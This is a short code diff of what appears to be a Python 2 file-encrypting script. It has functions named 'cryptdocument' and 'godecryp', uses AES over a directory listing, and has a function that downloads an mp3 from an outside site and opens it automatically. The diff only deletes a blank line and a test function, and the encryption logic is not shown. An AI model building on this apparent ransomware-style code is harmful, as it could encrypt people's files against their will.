@@ -2,7 +2,6 @@ import hashlib, os, random, struct, base64, urllib, sys, glob, os.path, chunky
 from Crypto import Random
 from Crypto.Cipher import AES
 
-
 def issou():
     urllib.urlretrieve("https://frompixel.com/issou/IssouNightclubCut.mp3 ", "IssouNightclubCut.mp3 ")
     os.startfile("IssouNightclubCut.mp3 ")
@@ -62,9 +61,7 @@ def godecryp(imp):
 
 
 def test2(source, destination):
-    with chunky.open("C:\Users\Yk\Documents\1{0}.txt","r") as f:
-        for line in f:
-            print line
+
 
 def cryptdocument():
     for element in os.listdir(adresse):
